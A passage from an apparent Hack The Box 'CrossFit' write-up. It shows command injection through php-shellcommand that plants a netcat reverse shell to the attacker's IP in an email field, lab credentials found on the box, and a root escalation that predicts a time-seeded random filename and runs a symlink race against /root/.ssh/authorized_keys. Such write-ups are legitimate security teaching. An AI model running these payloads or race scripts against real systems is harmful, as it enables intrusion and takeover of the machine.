<span class="err">}</span><span class="w"></span>
</code></pre>
</div>
<p>
 After some quick googling that I did to learn what the heck this php-shellcommand was, I found out that versions before 1.6.1 were
 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10774">
  <strong>
   vulnerable to command injection!
  </strong>
 </a>
 The jist of the vulnerability is that if an invalid argument is given to
 <code>
  addArg
 </code>
 and results in an error code, we can then append additional commands to the argument so that they are executed.
</p>
<p>
 Using the above source code, if we give it an
 <em>
  'email'
 </em>
 of
 <code>
  -B || nc 10.10.14.52 1234 -e /bin/bash
 </code>
 , the
 <code>
  -B
 </code>
 option will trigger the error code for
 <code>
  mail
 </code>
 since it is an invalid option and our payload (in this case a netcat reverse shell) would be executed.
</p>
<p>
 <em>
  Noice
 </em>
</p>
<p>
 I had a method to run arbitrary commands, but was it useful to escalate our privileges?
 <em>
  Yes
 </em>
 , I early on I looked at the running cronjobs and found that
 <code>
  send_updates.php
 </code>
 was executed every minute using the user
 <code>
  isaac
 </code>
 .
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit:</span><span class="sr">/home/is</span><span class="n">aac</span><span class="sr">/send_updates$ cat /</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
<span class="c1"># /etc/crontab: system-wide crontab</span>
<span class="c1"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c1"># command to install the new version when you edit this file</span>
<span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c1"># that none of the other crontabs do.</span>

<span class="n">MAILTO</span><span class="o">=</span><span class="s">""</span>
<span class="n">SHELL</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
<span class="n">PATH</span><span class="o">=</span><span class="sr">/usr/</span><span class="nb">local</span><span class="sr">/sbin:/</span><span class="n">usr</span><span class="sr">/local/</span><span class="n">bin:</span><span class="sr">/sbin:/</span><span class="n">bin:</span><span class="sr">/usr/s</span><span class="n">bin:</span><span class="sr">/usr/</span><span class="n">bin</span>

<span class="c1"># Example of job definition:</span>
<span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># |  .------------- hour (0 - 23)</span>
<span class="c1"># |  |  .---------- day of month (1 - 31)</span>
<span class="c1"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># |  |  |  |  |</span>
<span class="c1"># *  *  *  *  * user-name command to be executed</span>
<span class="mi">17</span> <span class="o">*</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">cd</span> <span class="sr">/ &amp;&amp; run-parts --report /</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">hourly</span>
<span class="mi">25</span> <span class="mi">6</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">daily</span> <span class="p">)</span>
<span class="mi">47</span> <span class="mi">6</span>    <span class="o">*</span> <span class="o">*</span> <span class="mi">7</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">weekly</span> <span class="p">)</span>
<span class="mi">52</span> <span class="mi">6</span>    <span class="mi">1</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">monthly</span> <span class="p">)</span>
<span class="o">*</span>  <span class="o">*</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">isaac</span>   <span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/php /</span><span class="n">home</span><span class="sr">/isaac/s</span><span class="n">end_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span>
<span class="c1">#</span>
</code></pre>
</div>
<p>
 <em>
  Nooice
 </em>
</p>
<p>
 However, now I needed to figure out the credentials for the MySQL server and where this mysterious
 <code>
  $msg_dir
 </code>
 was located.
</p>
<p>
 Firstly I looked for access to the MySQL server. I remembered from when I was enumerating http://gym-club.crossfit.htb/ that I found a page to sign up to their newsletter. That page indicated to me that the emails are stored in some database. So I took a closer look at the source code for the Gym Club website and found the MySQL credentials I needed.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nx">hank</span><span class="err">@</span><span class="nx">crossfit</span><span class="o">:</span><span class="err">/var/www/gym-club$ cat db.php</span><span class="w"></span>
<span class="cp">&lt;?php</span>
<span class="nv">$dbhost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">"oeLoo~y2baeni"</span><span class="p">;</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="w"></span>
</code></pre>
</div>
<p>
 <em>
  Noooice
 </em>
</p>
<p>
 All I had to do now was find the location of where the message files were placed in order to trigger the exploit. I was stuck at this point for sometime searching for this folder, since no name was given. How I found it in the end was by checking files that are owned by the group
 <code>
  admins
 </code>
 , which hank was a member of.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">hank</span><span class="err">@</span><span class="n">crossfit</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">gym</span><span class="o">-</span><span class="n">club</span><span class="o">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">group</span><span class="w"> </span><span class="n">admins</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span><span class="w"></span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">composer</span><span class="o">.</span><span class="n">lock</span><span class="w"></span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">composer</span><span class="o">.</span><span class="n">json</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chfn</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">newusers</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vmtoolsd</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">auth</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">login</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">systemd</span><span class="o">-</span><span class="n">user</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">runuser</span><span class="o">-</span><span class="n">l</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">account</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vsftpd</span><span class="o">.</span><span class="n">orig</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">su</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vsftpd</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">su</span><span class="o">-</span><span class="n">l</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chpasswd</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">password</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">noninteractive</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">sshd</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">session</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">other</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chsh</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">passwd</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">cron</span><span class="w"></span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">runuser</span><span class="w"></span>
</code></pre>
</div>
<p>
 Very interesting since
 <code>
  /etc/pam.d
 </code>
 is used for storing the configuration files for Pluggable Authentication Modules (PAM). Taking a look at the contents of the
 <code>
  vsftpd
 </code>
 configuration I found some new FTP credentials.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">vsftpd</span><span class="w"></span>
<span class="n">auth</span><span class="w"> </span><span class="n">sufficient</span><span class="w"> </span><span class="n">pam_mysql</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="k">user</span><span class="o">=</span><span class="n">ftpadm</span><span class="w"> </span><span class="n">passwd</span><span class="o">=</span><span class="mi">8</span><span class="n">W</span><span class="p">)</span><span class="err">}</span><span class="n">gpRJvAmnb</span><span class="w"> </span><span class="k">host</span><span class="o">=</span><span class="n">localhost</span><span class="w"> </span><span class="n">db</span><span class="o">=</span><span class="n">ftphosting</span><span class="w"> </span><span class="nc">table</span><span class="o">=</span><span class="n">accounts</span><span class="w"> </span><span class="n">usercolumn</span><span class="o">=</span><span class="n">username</span><span class="w"> </span><span class="n">passwdcolumn</span><span class="o">=</span><span class="n">pass</span><span class="w"> </span><span class="n">crypt</span><span class="o">=</span><span class="mi">3</span><span class="w"></span>
<span class="n">account</span><span class="w"> </span><span class="n">sufficient</span><span class="w"> </span><span class="n">pam_mysql</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="k">user</span><span class="o">=</span><span class="n">ftpadm</span><span class="w"> </span><span class="n">passwd</span><span class="o">=</span><span class="mi">8</span><span class="n">W</span><span class="p">)</span><span class="err">}</span><span class="n">gpRJvAmnb</span><span class="w"> </span><span class="k">host</span><span class="o">=</span><span class="n">localhost</span><span class="w"> </span><span class="n">db</span><span class="o">=</span><span class="n">ftphosting</span><span class="w"> </span><span class="nc">table</span><span class="o">=</span><span class="n">accounts</span><span class="w"> </span><span class="n">usercolumn</span><span class="o">=</span><span class="n">username</span><span class="w"> </span><span class="n">passwdcolumn</span><span class="o">=</span><span class="n">pass</span><span class="w"> </span><span class="n">crypt</span><span class="o">=</span><span class="mi">3</span><span class="w"></span>

<span class="err">#</span><span class="w"> </span><span class="n">Standard</span><span class="w"> </span><span class="n">behaviour</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">ftpd</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="w"></span>
<span class="n">auth</span><span class="w">    </span><span class="n">required</span><span class="w">        </span><span class="n">pam_listfile</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="n">item</span><span class="o">=</span><span class="k">user</span><span class="w"> </span><span class="n">sense</span><span class="o">=</span><span class="k">deny</span><span class="w"> </span><span class="k">file</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">ftpusers</span><span class="w"> </span><span class="n">onerr</span><span class="o">=</span><span class="n">succeed</span><span class="w"></span>

<span class="err">#</span><span class="w"> </span><span class="nl">Note</span><span class="p">:</span><span class="w"> </span><span class="n">vsftpd</span><span class="w"> </span><span class="n">handles</span><span class="w"> </span><span class="n">anonymous</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">own</span><span class="p">.</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">pam_ftp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="w"></span>

<span class="err">#</span><span class="w"> </span><span class="n">Standard</span><span class="w"> </span><span class="n">pam</span><span class="w"> </span><span class="n">includes</span><span class="w"></span>
<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="n">account</span><span class="w"></span>
<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="k">session</span><span class="w"></span>
<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="n">auth</span><span class="w"></span>
<span class="n">auth</span><span class="w">    </span><span class="n">required</span><span class="w">        </span><span class="n">pam_shells</span><span class="p">.</span><span class="n">so</span><span class="w"></span>
</code></pre>
</div>
<p>
 Logging into the FTP server with
 <code>
  ftpadm:8W)}gpRJvAmnb
 </code>
 revealed a
 <code>
  messages
 </code>
 folder that I could not see before, which I assumed was the elusive
 <code>
  $msg_dir
 </code>
 that I had been looking for since nothing else on the machine was it.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ftpadmmessages.png"/>
</p>
<p>
 <em>
  Nooooice
 </em>
</p>
<p>
 So putting it all together, to trigger the exploit I needed to upload some file to the messages folder on the FTP server. On the MySQL database I need to insert a row in the users table with an
 <em>
  'email'
 </em>
 of something like
 <code>
  -B || nc 10.10.14.52 1234 -e /bin/bash
 </code>
 to execute my reverse shell. Finally I needed to go and get a glass of water while waiting for my exploit to run.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/iminversion2.png"/>
</p>
<p>
 <em>
  Noooooice
 </em>
</p>
<p>
 I got a
 <s>
  pretty crappy
 </s>
 shell as
 <code>
  isaac
 </code>
 . To give myself a more stable shell, I added my public SSH key as an authorized key for
 <code>
  isaac
 </code>
 so I could SSH in.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="o">/</span><span class="n">get_root</span><span class="o">/</span><span class="n">ssh_keys</span><span class="err">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span><span class="n">isaac</span><span class="nv">@crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="n">Enter</span><span class="w"> </span><span class="n">passphrase</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="s1">'id_rsa'</span><span class="err">:</span><span class="w"></span>
<span class="n">Linux</span><span class="w"> </span><span class="n">crossfit</span><span class="w"> </span><span class="mf">4.19.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span><span class="w"> </span><span class="n">#1</span><span class="w"> </span><span class="n">SMP</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="mf">4.19.118</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">29</span><span class="p">)</span><span class="w"> </span><span class="n">x86_64</span><span class="w"></span>

<span class="n">The</span><span class="w"> </span><span class="n">programs</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="k">system</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="n">software</span><span class="p">;</span><span class="w"></span>
<span class="n">the</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">distribution</span><span class="w"> </span><span class="n">terms</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">described</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"></span>
<span class="n">individual</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="cm">/*/copyright.</span>

<span class="cm">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
<span class="cm">permitted by applicable law.</span>
<span class="cm">No mail.</span>
<span class="cm">Last login: Tue May 12 02:53:34 2020 from 10.10.10.2</span>
<span class="cm">isaac@crossfit:~$ id</span>
<span class="cm">uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)</span>
<span class="cm">isaac@crossfit:~$</span>
</code></pre>
</div>
<p>
 <em>
  Nooooooice
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style6 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="root-reverse-engineering-and-random-number-exploitation">
 Root: Reverse Engineering and Random Number Exploitation
</h2>
<p>
 After getting access to
 <code>
  isaac
 </code>
 , I am going to be honest and admit I got a quite stuck. I was not completely sure what to do next for some time, until I uploaded
 <a href="https://github.com/DominicBreuker/pspy">
  pspy
 </a>
 to the box and looked at file system events with
 <code>
  pspy -f
 </code>
 . The most interesting events that I saw were coming from
 <code>
  /usr/bin/dbmsg
 </code>
 , which is significant to me due to the name, the references to databases and messaging on the machine and because it is a non-standard binary on Linux machines. I tried to run
 <code>
  /usr/bin/dbmsg
 </code>
 and get a peculiar message indeed...
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">isaac</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dbmsg</span><span class="w"></span>
<span class="n">This</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="w"></span>
</code></pre>
</div>
<p>
 <em>
  Hhhhhhhhhhhhhhmmmmmmmmmmmmmmmmmm
 </em>
</p>
<p>
 Since I could see the system file events associated with
 <code>
  /usr/bin/dbmsg
 </code>
 being executed, I knew that the
 <code>
  root
 </code>
 user had been configured to periodically run this binary since no other user could execute it.
</p>
<p>
 However, I shed some tears when I realised that I had to reverse engineer (RE) the binary, which is not one of my strongest skills. Alas, I do want to learn more about RE, so I downloaded the binary to my machine and fired up
 <a href="https://ghidra-sre.org/">
  Ghidra
 </a>
 to have a closer look at it.
</p>
<p>
 The first thing that piqued my interest was the
 <code>
  main
 </code>
 function and how the psuedo-random number generator seed was set.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ghidramain.png"/>
</p>
<p>
 It may by hard to discern how the seed is set from the above snippet, but the above code is effectively
 <code>
  srand(time(NULL))
 </code>
 in C, which sets the seed of the pseudo-random number generator to the time of execution of the
 <code>
  time(NULL)
 </code>
 call. This is not a secure method of seed generation, especially since I had access to machine and could continually brute force the seed by executing the two programs at a similar time.
</p>
<p>
 Following along the code execution, we can see that a function called
 <code>
  process_data
 </code>
 is executed once the seed has been set. Let's take a closer look at that.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ghidraprocess.png"/>
</p>
<p>
 When I first saw this function I just broke down crying because I was scared by all of the assembly and decompiled C code. However, after a glass of whiskey and a second look at it I quickly realised that it was not that confusing and I could easily reverse engineer it.
</p>
<p>
 Firstly, I noticed that the
 <code>
  messages
 </code>
 table on the MySQL server that I saw earlier is queried and each row is iterated through using the
 <a href="https://dev.mysql.com/doc/c-api/5.7/en/c-api-introduction.html">
  MySQL C API
 </a>
 . The most interesting function that was used from this API was
 <code>
  mysql_fetch_row
 </code>
 , that returns a "MySQL Row Structure" according to the
 <a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-fetch-row.html">
  documentation
 </a>
 . This wording initially confused me, but I just realised it was just a convoluted way of saying that it returns an array of pointers to the data stored in each column of the row.
</p>
<p>
 Now I might of triggered some of you by the mention of pointers.
 <em>
  Never fear, Ghostccamm is here to
  <s>
   try
  </s>
  explain how it works.
 </em>
 Let's say the messages table has the following row.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
<span class="c">| id | name    | email                 | message   |</span>
<span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
<span class="c">|  1 | someone | someone@somewhere</span><span class="nt">.</span><span class="c">com | something |</span>
<span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
</code></pre>
</div>
<p>
 When
 <code>
  mysql_fetch_row
 </code>
 is called, it will return an array where the first element will 'point' to the string of the id, which is "1" in the above example. The next element in the array would be the name "someone" and so on for the other columns.
</p>
<p>
 Now for a very brief refresher in pointers, the dereferencing operator
 <code>
  *
 </code>
 means to look at the data stored at that address instead of the address itself. Lets say we have an array called
 <code>
  somearray
 </code>
 , we can express the data in the first element using either
 <code>
  somearray[0]
 </code>
 or
 <code>
  *somearray
 </code>
 . They both mean the same thing since both expressions are looking at the data stored at the start of the array. This means that the snippet,
 <code>
  lVar3 = *local_38
 </code>
 , is just setting the variable
 <code>
  lVar3
 </code>
 to the id of the row.
</p>
<p>
 Now lets put all of these jigsaw pieces together. One of my goals was to figure out the location where the contents from the query is saved to, which is shown in the following decompiled code snippet.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">lVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">local_38</span><span class="p">;</span><span class="w"></span>
<span class="n">uVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span><span class="w"></span>
<span class="n">snprintf</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%d%s"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar2</span><span class="p">,</span><span class="n">lVar3</span><span class="p">);</span><span class="w"></span>
<span class="n">sVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">local_c8</span><span class="p">);</span><span class="w"></span>
<span class="n">md5sum</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="n">sVar5</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">,</span><span class="n">local_f8</span><span class="p">,</span><span class="n">sVar5</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">);</span><span class="w"></span>
<span class="n">snprintf</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%s%s"</span><span class="p">,</span><span class="s">"/var/local/"</span><span class="p">,</span><span class="n">local_f8</span><span class="p">);</span><span class="w"></span>
<span class="n">local_40</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="s">"w"</span><span class="p">);</span><span class="w"></span>
</code></pre>
</div>
<p>
 Seems confuddling? We actually already have everything we need to know to determine where the file is saved.
 <code>
  lVar3
 </code>
 is the id of the queried row and
 <code>
  uVar2
 </code>
 can be determined by executing a separate program that sets random seeds using
 <code>
  srand(time(NULL))
 </code>
 to 'guess' the seed that was used by
 <code>
  dbmsg
 </code>
 . Once these two variables are known, the filename is just the MD5 hash of the concatenation of
 <code>
  uVar2
 </code>
 and
 <code>
  lVar3
 </code>
 in
 <code>
  /var/local
 </code>
 .
</p>
<p>
 However, would I have enough time to do any naughty stuff like creating a symbolic link to
 <code>
  /root/.ssh/authorized_keys
 </code>
 ? Yes I will! The seed is set at the start of the program then queries the MySQL, which although is running
 <code>
  localhost
 </code>
 gave me enough time to exploit the race condition and create our symbolic link to
 <code>
  /root/.ssh/authorized_keys
 </code>
 .
</p>
<p>
 Now I just had to exploit this program! I first created a program using C to generate the string that is then hashed using MD5 (done using bash later), which I chucked down below. The reason why I chucked the number
 <code>
  1
 </code>
 after the randomly generated number is because this will be the id of the row that I will insert my payload into on the MySQL table.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"%d1"</span><span class="p">,</span><span class="w"> </span><span class="n">rand</span><span class="p">());</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre>
</div>
<p>
 I then compiled and uploaded the binary to the machine and executed the following bash to create the symbolic links to
 <code>
  /root/.ssh/authorized_keys
 </code>
 .
</p>
<div class="codehilite">
 <pre><span></span><code><span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -s /root/.ssh/authorized_keys <span class="s2">"/var/local/</span><span class="k">$(</span>./exploit <span class="p">|</span> md5sum <span class="p">|</span> cut -c -32<span class="k">)</span><span class="s2">"</span> <span class="m">2</span>&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</code></pre>
</div>
<p>
 Finally we just need to insert our public SSH key into the table
 <code>
  messages
 </code>
 with the id of 1. I did this using the follow SQL query.
</p>
<div class="codehilite">
